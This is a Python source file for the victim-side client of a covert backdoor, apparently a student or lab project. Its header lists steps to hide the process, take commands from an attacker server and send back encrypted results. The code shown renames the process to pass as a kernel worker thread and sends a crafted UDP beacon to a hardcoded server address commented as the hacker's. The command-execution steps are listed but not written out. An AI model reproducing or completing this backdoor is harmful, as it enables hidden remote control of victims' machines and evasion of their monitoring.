#!/usr/bin/env python
# ###################################################################
# vic.py 
# 
# main functions:
#	- 0. when this program is run, change the process name
#	- 1. send initial packet that backdoor client program is run to server
#	- 2. wait for command from backdoor server (sniffing)
#	- 3. extract the command data
#	- 4. excute the command data
#	- 5. get the result from command line
#	- 6. encrypt the data to send
#	- 7. send encrypted data to backdoor server
#	- 
# ###################################################################
from scapy.all import *
from encrypt import *
import argparse
import sys
import string
from setproctitle import getproctitle, setproctitle

KEY = "runningman"	# used for decryption
serv_addr = "192.168.1.9"	# hacker waits for client to run the program

def change_proc():
	try:
		from setproctitle import getproctitle, setproctitle
	except ImportError:
		logging.warning(
		    ("Unable to set import 'setproctitle', "
		     "process name cannot be changed"))
	else:
		setproctitle("%s" % "[kworker/2:3><><><><><><]")

def main():

	# 0. when this program is run, change the process name
	change_proc()
	
	# 1. send initial packet that backdoor client program is run to server
	send(IP(dst=serv_addr, tos=ord('B'), id=ord('K'))/fuzz(UDP(dport=80, sport=123))/'start')
	

	


if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print("Terminate signal received. Exiting...")